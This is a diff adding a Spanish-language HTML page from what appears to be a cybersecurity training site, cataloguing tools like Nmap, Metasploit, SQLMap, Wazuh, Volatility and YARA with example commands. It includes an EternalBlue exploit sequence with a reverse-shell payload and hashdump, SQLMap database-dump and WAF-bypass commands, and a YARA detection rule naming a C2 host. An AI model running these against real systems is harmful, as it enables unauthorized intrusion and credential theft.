@@ -1,0 +1,785 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Herramientas - CDPN</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <!-- NAVBAR -->
+    <nav class="navbar">
+        <div class="nav-container">
+            <a href="app.html" class="nav-logo"><i class="fas fa-shield-halved"></i> CDPN</a>
+            <ul class="nav-menu">
+                <li><a href="app.html"><i class="fas fa-home"></i> Inicio</a></li>
+                <li class="nav-dropdown">
+                    <a href="app.html#modulos"><i class="fas fa-layer-group"></i> Módulos <i class="fas fa-chevron-down"></i></a>
+                    <ul class="dropdown-menu">
+                        <li><a href="app.html#mod-00"><span class="dot intro"></span> Introducción</a></li>
+                        <li><a href="app.html#mod-01"><span class="dot red"></span> Ciberseguridad Ofensiva</a></li>
+                        <li><a href="app.html#mod-02"><span class="dot blue"></span> Seguridad de la Información</a></li>
+                        <li><a href="app.html#mod-03ai"><span class="dot ai"></span> AI Agents & Tools</a></li>
+                        <li><a href="app.html#mod-03bt"><span class="dot blue"></span> Blue Team / Defensa</a></li>
+                        <li><a href="app.html#mod-04pt"><span class="dot purple"></span> Purple Team</a></li>
+                        <li><a href="app.html#mod-04labs"><span class="dot lab"></span> Laboratorios</a></li>
+                    </ul>
+                </li>
+                <li><a href="retos.html"><i class="fas fa-trophy"></i> Retos</a></li>
+                <li><a href="herramientas.html" class="active"><i class="fas fa-tools"></i> Herramientas</a></li>
+                <li><a href="labs.html"><i class="fas fa-flask"></i> Labs</a></li>
+                <li><a href="recursos.html"><i class="fas fa-book"></i> Recursos</a></li>
+            </ul>
+            <div class="nav-actions">
+                <button class="theme-toggle" id="themeToggle"><i class="fas fa-moon"></i></button>
+                <a href="https://github.com/0xvanguard/CyberDefense-Pro-Network" class="nav-github" target="_blank"><i class="fab fa-github"></i></a>
+            </div>
+        </div>
+    </nav>
+
+    <!-- PAGE HERO -->
+    <section class="page-hero herramientas-hero">
+        <div class="page-hero-content">
+            <span class="page-badge"><i class="fas fa-tools"></i> STACK TECNOLÓGICO</span>
+            <h1>Herramientas <span class="gradient-text">Profesionales</span></h1>
+            <p>Las mismas herramientas que usan los profesionales de ciberseguridad en empresas Fortune 500 y agencias gubernamentales.</p>
+            <div class="hero-stats">
+                <div class="stat"><span class="stat-number">40+</span><span class="stat-label">Herramientas</span></div>
+                <div class="stat"><span class="stat-number">6</span><span class="stat-label">Categorías</span></div>
+                <div class="stat"><span class="stat-number">3</span><span class="stat-label">Niveles</span></div>
+            </div>
+        </div>
+    </section>
+
+    <main class="main-content">
+
+        <!-- CATEGORÍA: RECONOCIMIENTO -->
+        <section class="tool-category-section">
+            <div class="category-header">
+                <div class="category-icon"><i class="fas fa-search"></i></div>
+                <div>
+                    <h2>Reconocimiento y Enumeration</h2>
+                    <p>Descubre hosts, puertos, servicios y tecnologías del objetivo.</p>
+                </div>
+            </div>
+
+            <div class="tools-grid-full">
+                <div class="tool-detail-card">
+                    <div class="tool-detail-header">
+                        <div class="tool-logo"><i class="fas fa-network-wired"></i></div>
+                        <div>
+                            <h3>Nmap</h3>
+                            <span class="tool-type">Escáner de redes</span>
+                        </div>
+                    </div>
+                    <p>El escáner de redes y puertos más popular del mundo. Esencial para cualquier pentest.</p>
+                    <div class="tool-features">
+                        <span class="feature-tag"><i class="fas fa-check"></i> Ping sweep</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Port scanning</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Service detection</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> OS fingerprinting</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> NSE scripts</span>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="code-lang">Comandos Comunes</span></div>
+                        <pre><code># Escaneo rápido de puertos comunes
+nmap target.com
+
+# Escaneo completo con versiones y scripts
+nmap -sV -sC -O -p- target.com
+
+# Escaneo stealth (SYN scan)
+nmap -sS -T2 -Pn target.com
+
+# Scripts de vulnerabilidad
+nmap --script=vuln -p 80,443,8080 target.com
+
+# Output organizado
+nmap -oA resultado target.com</code></pre>
+                    </div>
+                    <div class="tool-meta">
+                        <span><i class="fas fa-download"></i> Gratis / Pre-instalado en Kali</span>
+                        <span><i class="fas fa-globe"></i> nmap.org</span>
+                    </div>
+                </div>
+
+                <div class="tool-detail-card">
+                    <div class="tool-detail-header">
+                        <div class="tool-logo"><i class="fas fa-spider"></i></div>
+                        <div>
+                            <h3>Gobuster</h3>
+                            <span class="tool-type">Directory Bruteforcing</span>
+                        </div>
+                    </div>
+                    <p>Descubre directorios, archivos y subdominios ocultos en servidores web.</p>
+                    <div class="tool-features">
+                        <span class="feature-tag"><i class="fas fa-check"></i> Directory mode</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> DNS mode</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> VHost mode</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Fuzzing</span>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="code-lang">Comandos Comunes</span></div>
+                        <pre><code># Directorios ocultos
+gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
+
+# Subdominios
+gobuster dns -d target.com -w subdomains.txt
+
+# VHosts
+gobuster vhost -u http://target.com -w vhosts.txt
+
+# Con extensiones
+gobuster dir -u http://target.com -w wordlist.txt -x php,html,txt</code></pre>
+                    </div>
+                    <div class="tool-meta">
+                        <span><i class="fas fa-download"></i> Gratis / Go install</span>
+                        <span><i class="fab fa-github"></i> github.com/OJ/gobuster</span>
+                    </div>
+                </div>
+
+                <div class="tool-detail-card">
+                    <div class="tool-detail-header">
+                        <div class="tool-logo"><i class="fas fa-database"></i></div>
+                        <div>
+                            <h3>Subfinder</h3>
+                            <span class="tool-type">Subdomain Discovery</span>
+                        </div>
+                    </div>
+                    <p>Encuentra subdominios usando múltiples fuentes pasivas (CT, DNS, APIs).</p>
+                    <div class="tool-features">
+                        <span class="feature-tag"><i class="fas fa-check"></i> 40+ fuentes</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Rápido</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Sin interactuar con el target</span>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="code-lang">Comandos</span></div>
+                        <pre><code># Básico
+subfinder -d target.com
+
+# Con todas las fuentes
+subfinder -d target.com -all
+
+# Output a archivo
+subfinder -d target.com -o subdomains.txt</code></pre>
+                    </div>
+                    <div class="tool-meta">
+                        <span><i class="fas fa-download"></i> Gratis / Go install</span>
+                        <span><i class="fab fa-github"></i> github.com/projectdiscovery/subfinder</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- CATEGORÍA: EXPLOTACIÓN WEB -->
+        <section class="tool-category-section">
+            <div class="category-header">
+                <div class="category-icon"><i class="fas fa-spider"></i></div>
+                <div>
+                    <h2>Explotación Web</h2>
+                    <p>Testing de aplicaciones web, interceptación de tráfico y explotación de vulnerabilidades.</p>
+                </div>
+            </div>
+
+            <div class="tools-grid-full">
+                <div class="tool-detail-card">
+                    <div class="tool-detail-header">
+                        <div class="tool-logo"><i class="fas fa-spider"></i></div>
+                        <div>
+                            <h3>Burp Suite</h3>
+                            <span class="tool-type">Proxy / Scanner / Repeater</span>
+                        </div>
+                    </div>
+                    <p>El framework integral para testing de seguridad de aplicaciones web. Usado por profesionales del 90%.</p>
+                    <div class="tool-features">
+                        <span class="feature-tag"><i class="fas fa-check"></i> Proxy intercept</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Intruder (fuzzing)</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Repeater (manual)</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Scanner (auto)</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Comparer</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Extensions</span>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="code-lang">Flujo de Trabajo</span></div>
+                        <pre><code># 1. Configurar proxy en el navegador
+# Puerto: 8080, Host: 127.0.0.1
+
+# 2. Intercept requests
+# Proxy → Intercept → ON
+
+# 3. Modificar payloads
+# Cambiar parámetros en la request
+
+# 4. Usar Intruder para fuzzing
+# Positions: Seleccionar parámetros
+# Payloads: Lists, numbers, dates
+
+# 5. Analizar respuestas
+# Comparer: Diferencias entre respuestas</code></pre>
+                    </div>
+                    <div class="tool-meta">
+                        <span><i class="fas fa-download"></i> Community: Gratis / Pro: $449/año</span>
+                        <span><i class="fas fa-globe"></i> portswigger.net</span>
+                    </div>
+                </div>
+
+                <div class="tool-detail-card">
+                    <div class="tool-detail-header">
+                        <div class="tool-logo"><i class="fas fa-explosion"></i></div>
+                        <div>
+                            <h3>Metasploit Framework</h3>
+                            <span class="tool-type">Framework de Explotación</span>
+                        </div>
+                    </div>
+                    <p>El framework de exploits más grande del mundo. Miles de exploits, payloads y post-explotación.</p>
+                    <div class="tool-features">
+                        <span class="feature-tag"><i class="fas fa-check"></i> 2000+ exploits</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Payloads</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Meterpreter</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Post-exploitation</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Auxiliary modules</span>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="code-lang">Metasploit Basics</span></div>
+                        <pre><code># Iniciar
+msfconsole
+
+# Buscar exploits
+search eternalblue
+search type:exploit platform:windows
+
+# Usar exploit
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Configurar
+set RHOSTS target_ip
+set LHOST attacker_ip
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+# Atacar
+exploit
+
+# Post-exploitation
+sysinfo
+getuid
+hashdump
+shell</code></pre>
+                    </div>
+                    <div class="tool-meta">
+                        <span><i class="fas fa-download"></i> Gratis / Pre-instalado en Kali</span>
+                        <span><i class="fas fa-globe"></i> metasploit.com</span>
+                    </div>
+                </div>
+
+                <div class="tool-detail-card">
+                    <div class="tool-detail-header">
+                        <div class="tool-logo"><i class="fas fa-code"></i></div>
+                        <div>
+                            <h3>SQLMap</h3>
+                            <span class="tool-type">SQL Injection Automation</span>
+                        </div>
+                    </div>
+                    <p>Automatiza la detección y explotación de inyecciones SQL en aplicaciones web.</p>
+                    <div class="tool-features">
+                        <span class="feature-tag"><i class="fas fa-check"></i> Detección automática</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> 6 tipos de inyección</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Extracción de datos</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> OS shell</span>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="code-lang">SQLMap Commands</span></div>
+                        <pre><code># Detección básica
+sqlmap -u "http://target.com/page?id=1"
+
+# Extraer bases de datos
+sqlmap -u "http://target.com/page?id=1" --dbs
+
+# Extraer tablas
+sqlmap -u "http://target.com/page?id=1" -D testdb --tables
+
+# Extraer datos
+sqlmap -u "http://target.com/page?id=1" -D testdb -T users --dump
+
+# POST request
+sqlmap -u "http://target.com/login" --data="user=admin&pass=*" --batch
+
+# Bypass WAF
+sqlmap -u "http://target.com/page?id=1" --tamper=space2comment</code></pre>
+                    </div>
+                    <div class="tool-meta">
+                        <span><i class="fas fa-download"></i> Gratis</span>
+                        <span><i class="fab fa-github"></i> github.com/sqlmapproject/sqlmap</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- CATEGORÍA: DEFENSA Y MONITOREO -->
+        <section class="tool-category-section">
+            <div class="category-header">
+                <div class="category-icon"><i class="fas fa-shield-alt"></i></div>
+                <div>
+                    <h2>Defensa y Monitoreo</h2>
+                    <p>SIEM, IDS/IPS, análisis de logs y detección de amenazas.</p>
+                </div>
+            </div>
+
+            <div class="tools-grid-full">
+                <div class="tool-detail-card">
+                    <div class="tool-detail-header">
+                        <div class="tool-logo"><i class="fas fa-chart-bar"></i></div>
+                        <div>
+                            <h3>Wazuh</h3>
+                            <span class="tool-type">SIEM / HIDS</span>
+                        </div>
+                    </div>
+                    <p>Plataforma de seguridad open source: monitoreo de endpoints, detección de amenazas y respuesta a incidentes.</p>
+                    <div class="tool-features">
+                        <span class="feature-tag"><i class="fas fa-check"></i> Log analysis</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> File integrity</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Rootkit detection</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Active response</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Compliance</span>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="code-lang">Configuración Básica</span></div>
+                        <pre><code># Instalación
+curl -sO https://packages.wazuh.com/4.7/wazuh-install.sh
+sudo bash wazuh-install.sh -a
+
+# Agent
+sudo apt install wazuh-agent
+sudo systemctl enable wazuh-agent
+sudo systemctl start wazuh-agent
+
+# Dashboard
+# https://wazuh-server:5601
+# admin / admin (cambiar después)</code></pre>
+                    </div>
+                    <div class="tool-meta">
+                        <span><i class="fas fa-download"></i> Gratis / Open Source</span>
+                        <span><i class="fas fa-globe"></i> wazuh.com</span>
+                    </div>
+                </div>
+
+                <div class="tool-detail-card">
+                    <div class="tool-detail-header">
+                        <div class="tool-logo"><i class="fas fa-chart-line"></i></div>
+                        <div>
+                            <h3>ELK Stack</h3>
+                            <span class="tool-type">Elasticsearch + Logstash + Kibana</span>
+                        </div>
+                    </div>
+                    <p>La suite completa para búsqueda, análisis y visualización de logs en tiempo real.</p>
+                    <div class="tool-features">
+                        <span class="feature-tag"><i class="fas fa-check"></i> Log aggregation</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Full-text search</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Dashboards</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Alerts</span>
+                    </div>
+                    <div class="tool-meta">
+                        <span><i class="fas fa-download"></i> Gratis (basic) / Licencia Enterprise</span>
+                        <span><i class="fas fa-globe"></i> elastic.co</span>
+                    </div>
+                </div>
+
+                <div class="tool-detail-card">
+                    <div class="tool-detail-header">
+                        <div class="tool-logo"><i class="fas fa-eye"></i></div>
+                        <div>
+                            <h3>Wireshark</h3>
+                            <span class="tool-type">Network Protocol Analyzer</span>
+                        </div>
+                    </div>
+                    <p>El analizador de protocolos de red más utilizado. Captura y examina tráfico en tiempo real.</p>
+                    <div class="tool-features">
+                        <span class="feature-tag"><i class="fas fa-check"></i> 2000+ protocolos</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Real-time capture</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Deep packet inspection</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> VoIP analysis</span>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="code-lang">Filtros Comunes</span></div>
+                        <pre><code># Filtrar por IP
+ip.addr == 192.168.1.100
+
+# Filtrar por puerto
+tcp.port == 80
+
+# Filtrar por protocolo
+http || dns
+
+# SQL injection attempts
+http.request.uri contains "SELECT" || http.request.uri contains "UNION"
+
+# DNS queries
+dns.qry.name contains "target.com"
+
+# Exportar paquetes
+# File → Export Specified Packets</code></pre>
+                    </div>
+                    <div class="tool-meta">
+                        <span><i class="fas fa-download"></i> Gratis / Multiplataforma</span>
+                        <span><i class="fas fa-globe"></i> wireshark.org</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- CATEGORÍA: FORENSE -->
+        <section class="tool-category-section">
+            <div class="category-header">
+                <div class="category-icon"><i class="fas fa-magnifying-glass"></i></div>
+                <div>
+                    <h2>Forense Digital</h2>
+                    <p>Análisis de discos, memoria, redes y evidencia digital.</p>
+                </div>
+            </div>
+
+            <div class="tools-grid-full">
+                <div class="tool-detail-card">
+                    <div class="tool-detail-header">
+                        <div class="tool-logo"><i class="fas fa-memory"></i></div>
+                        <div>
+                            <h3>Volatility</h3>
+                            <span class="tool-type">Memory Forensics</span>
+                        </div>
+                    </div>
+                    <p>El framework líder para análisis forense de memoria RAM. Extrae procesos, conexiones, DLLs y más.</p>
+                    <div class="tool-features">
+                        <span class="feature-tag"><i class="fas fa-check"></i> Process listing</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Network connections</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> DLL analysis</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Registry hives</span>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="code-lang">Volatility Commands</span></div>
+                        <pre><code># Identificar imagen
+volatility -f memory.dump imageinfo
+
+# Listar procesos
+volatility -f memory.dump --profile=Win7SP1x64 pslist
+
+# Procesos con árbol
+volatility -f memory.dump --profile=Win7SP1x64 pstree
+
+# Conexiones de red
+volatility -f memory.dump --profile=Win7SP1x64 netscan
+
+# DLLs
+volatility -f memory.dump --profile=Win7SP1x64 dlllist
+
+# Dump de proceso
+volatility -f memory.dump --profile=Win7SP1x64 procdump -p 1234</code></pre>
+                    </div>
+                    <div class="tool-meta">
+                        <span><i class="fas fa-download"></i> Gratis / Python</span>
+                        <span><i class="fab fa-github"></i> github.com/volatilityfoundation/volatility</span>
+                    </div>
+                </div>
+
+                <div class="tool-detail-card">
+                    <div class="tool-detail-header">
+                        <div class="tool-logo"><i class="fas fa-desktop"></i></div>
+                        <div>
+                            <h3>Autopsy</h3>
+                            <span class="tool-type">Disk Forensics GUI</span>
+                        </div>
+                    </div>
+                    <p>Plataforma forense digital con interfaz gráfica para análisis de discos y evidencia.</p>
+                    <div class="tool-features">
+                        <span class="feature-tag"><i class="fas fa-check"></i> Disk images</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> File recovery</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Timeline analysis</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Keyword search</span>
+                    </div>
+                    <div class="tool-meta">
+                        <span><i class="fas fa-download"></i> Gratis / Multiplataforma</span>
+                        <span><i class="fas fa-globe"></i> sleuthkit.org</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- CATEGORÍA: CLOUD -->
+        <section class="tool-category-section">
+            <div class="category-header">
+                <div class="category-icon"><i class="fas fa-cloud"></i></div>
+                <div>
+                    <h2>Cloud Security</h2>
+                    <p>Auditoría, configuración segura y pentesting en la nube.</p>
+                </div>
+            </div>
+
+            <div class="tools-grid-full">
+                <div class="tool-detail-card">
+                    <div class="tool-detail-header">
+                        <div class="tool-logo"><i class="fas fa-shield-alt"></i></div>
+                        <div>
+                            <h3>Prowler</h3>
+                            <span class="tool-type">AWS/Azure/GCP Auditor</span>
+                        </div>
+                    </div>
+                    <p>Herramienta de auditoría de seguridad para entornos de nube. Compliance con CIS Benchmark.</p>
+                    <div class="tool-features">
+                        <span class="feature-tag"><i class="fas fa-check"></i> AWS</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Azure</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> GCP</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> CIS Benchmark</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> PCI-DSS</span>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="code-lang">AWS Audit</span></div>
+                        <pre><code># Instalación
+pip install prowler
+
+# Ejecutar auditoría completa
+prowler aws
+
+# Por servicio
+prowler aws --checks s3_bucket_public_access
+prowler aws --checks iam_root_mfa
+
+# Output en HTML
+prowler aws --output-format html</code></pre>
+                    </div>
+                    <div class="tool-meta">
+                        <span><i class="fas fa-download"></i> Gratis / Open Source</span>
+                        <span><i class="fab fa-github"></i> github.com/prowler-cloud/prowler</span>
+                    </div>
+                </div>
+
+                <div class="tool-detail-card">
+                    <div class="tool-detail-header">
+                        <div class="tool-logo"><i class="fas fa-key"></i></div>
+                        <div>
+                            <h3>Checkov</h3>
+                            <span class="tool-type">IaC Security Scanner</span>
+                        </div>
+                    </div>
+                    <p>Escanea infraestructura como código (Terraform, CloudFormation, K8s) para detectar malas configuraciones.</p>
+                    <div class="tool-features">
+                        <span class="feature-tag"><i class="fas fa-check"></i> Terraform</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> CloudFormation</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Kubernetes</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Docker</span>
+                    </div>
+                    <div class="tool-meta">
+                        <span><i class="fas fa-download"></i> Gratis / Open Source</span>
+                        <span><i class="fab fa-github"></i> github.com/bridgecrewio/checkov</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- CATEGORÍA: ANÁLISIS DE MALWARE -->
+        <section class="tool-category-section">
+            <div class="category-header">
+                <div class="category-icon"><i class="fas fa-virus"></i></div>
+                <div>
+                    <h2>Análisis de Malware</h2>
+                    <p>Reverse engineering, detección y análisis de software malicioso.</p>
+                </div>
+            </div>
+
+            <div class="tools-grid-full">
+                <div class="tool-detail-card">
+                    <div class="tool-detail-header">
+                        <div class="tool-logo"><i class="fas fa-shield-virus"></i></div>
+                        <div>
+                            <h3>YARA</h3>
+                            <span class="tool-type">Pattern Matching</span>
+                        </div>
+                    </div>
+                    <p>El "grep" del malware. Crea reglas para identificar y clasificar muestras de malware.</p>
+                    <div class="tool-features">
+                        <span class="feature-tag"><i class="fas fa-check"></i> Pattern matching</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Binary analysis</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Rule creation</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Integration</span>
+                    </div>
+                    <div class="code-block">
+                        <div class="code-header"><span class="code-lang">Regla YARA</span></div>
+                        <pre><code>rule Malware_Ejemplo {
+    meta:
+        author = "CDPN"
+        description = "Detecta malware de ejemplo"
+
+    strings:
+        $s1 = "cmd.exe /c" nocase
+        $s2 = "http://c2server.com"
+        $s3 = { 6A 00 6A 00 6A 03 6A 00 }
+
+    condition:
+        2 of ($s*) and filesize &lt; 500KB
+}
+
+# Uso
+yara -r rules/ malware_sample.exe</code></pre>
+                    </div>
+                    <div class="tool-meta">
+                        <span><i class="fas fa-download"></i> Gratis</span>
+                        <span><i class="fas fa-globe"></i> virustotal.github.io/yara</span>
+                    </div>
+                </div>
+
+                <div class="tool-detail-card">
+                    <div class="tool-detail-header">
+                        <div class="tool-logo"><i class="fas fa-search"></i></div>
+                        <div>
+                            <h3>Ghidra</h3>
+                            <span class="tool-type">Reverse Engineering</span>
+                        </div>
+                    </div>
+                    <p>El descompilador de NSA. Analiza binarios, entiende el código y encuentra vulnerabilidades.</p>
+                    <div class="tool-features">
+                        <span class="feature-tag"><i class="fas fa-check"></i> Decompiler</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Multi-architecture</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Scripting</span>
+                        <span class="feature-tag"><i class="fas fa-check"></i> Collaboration</span>
+                    </div>
+                    <div class="tool-meta">
+                        <span><i class="fas fa-download"></i> Gratis / NSA</span>
+                        <span><i class="fas fa-globe"></i> ghidra-sre.org</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- RESUMEN COMPARATIVO -->
+        <section class="comparison-section">
+            <h2><i class="fas fa-table"></i> Tabla Comparativa por Nivel</h2>
+            <div class="table-wrapper">
+                <table class="comparison-table">
+                    <thead>
+                        <tr>
+                            <th>Nivel</th>
+                            <th>Herramienta</th>
+                            <th>Categoría</th>
+                            <th>Costo</th>
+                            <th>Uso</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+                        <tr class="level-beginner">
+                            <td><span class="level-badge beginner">Principiante</span></td>
+                            <td><i class="fas fa-laptop-code"></i> VirtualBox</td>
+                            <td>Entorno</td>
+                            <td>Gratis</td>
+                            <td>VMs para laboratorios</td>
+                        </tr>
+                        <tr class="level-beginner">
+                            <td><span class="level-badge beginner">Principiante</span></td>
+                            <td><i class="fab fa-linux"></i> Kali Linux</td>
+                            <td>OS</td>
+                            <td>Gratis</td>
+                            <td>Distro con 600+ herramientas</td>
+                        </tr>
+                        <tr class="level-beginner">
+                            <td><span class="level-badge beginner">Principiante</span></td>
+                            <td><i class="fas fa-terminal"></i> Terminal</td>
+                            <td>Básico</td>
+                            <td>Gratis</td>
+                            <td>Comandos básicos de Linux</td>
+                        </tr>
+                        <tr class="level-intermediate">
+                            <td><span class="level-badge intermediate">Intermedio</span></td>
+                            <td><i class="fas fa-network-wired"></i> Nmap</td>
+                            <td>Recon</td>
+                            <td>Gratis</td>
+                            <td>Escaneo de redes y puertos</td>
+                        </tr>
+                        <tr class="level-intermediate">
+                            <td><span class="level-badge intermediate">Intermedio</span></td>
+                            <td><i class="fas fa-spider"></i> Burp Suite</td>
+                            <td>Web</td>
+                            <td>Free/$449</td>
+                            <td>Proxy y testing web</td>
+                        </tr>
+                        <tr class="level-intermediate">
+                            <td><span class="level-badge intermediate">Intermedio</span></td>
+                            <td><i class="fas fa-explosion"></i> Metasploit</td>
+                            <td>Explotación</td>
+                            <td>Gratis</td>
+                            <td>Framework de exploits</td>
+                        </tr>
+                        <tr class="level-intermediate">
+                            <td><span class="level-badge intermediate">Intermedio</span></td>
+                            <td><i class="fas fa-chart-bar"></i> Wazuh</td>
+                            <td>SIEM</td>
+                            <td>Gratis</td>
+                            <td>Monitoreo y detección</td>
+                        </tr>
+                        <tr class="level-advanced">
+                            <td><span class="level-badge advanced">Avanzado</span></td>
+                            <td><i class="fas fa-crosshairs"></i> Cobalt Strike</td>
+                            <td>C2</td>
+                            <td>$5,900/año</td>
+                            <td>Command & Control</td>
+                        </tr>
+                        <tr class="level-advanced">
+                            <td><span class="level-badge advanced">Avanzado</span></td>
+                            <td><i class="fas fa-memory"></i> Volatility</td>
+                            <td>Forense</td>
+                            <td>Gratis</td>
+                            <td>Análisis de memoria</td>
+                        </tr>
+                        <tr class="level-advanced">
+                            <td><span class="level-badge advanced">Avanzado</span></td>
+                            <td><i class="fas fa-search"></i> BloodHound</td>
+                            <td>AD</td>
+                            <td>Gratis</td>
+                            <td>Mapeo de Active Directory</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- FOOTER -->
+    <footer class="footer">
+        <div class="footer-content">
+            <div class="footer-grid">
+                <div class="footer-col">
+                    <h4><i class="fas fa-shield-halved"></i> CDPN</h4>
+                    <p>Formando profesionales de ciberdefensa en todo el mundo.</p>
+                </div>
+                <div class="footer-col">
+                    <h4>Plataforma</h4>
+                    <ul>
+                        <li><a href="app.html#mod-00">Introducción</a></li>
+                        <li><a href="app.html#mod-01">Ciberseguridad Ofensiva</a></li>
+                        <li><a href="app.html#mod-03bt">Blue Team</a></li>
+                        <li><a href="app.html#mod-04pt">Purple Team</a></li>
+                    </ul>
+                </div>
+                <div class="footer-col">
+                    <h4>Secciones</h4>
+                    <ul>
+                        <li><a href="retos.html">Retos</a></li>
+                        <li><a href="herramientas.html">Herramientas</a></li>
+                        <li><a href="labs.html">Labs</a></li>
+                        <li><a href="recursos.html">Recursos</a></li>
+                    </ul>
+                </div>
+                <div class="footer-col">
+                    <h4>Comunidad</h4>
+                    <ul>
+                        <li><a href="https://github.com/0xvanguard/CyberDefense-Pro-Network" target="_blank"><i class="fab fa-github"></i> GitHub</a></li>
+                        <li><a href="#"><i class="fab fa-discord"></i> Discord</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="footer-bottom">
+                <p>&copy; 2026 CyberDefense Pro Network. Todos los derechos reservados.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script src="script.js"></script>
+</body>
+</html>
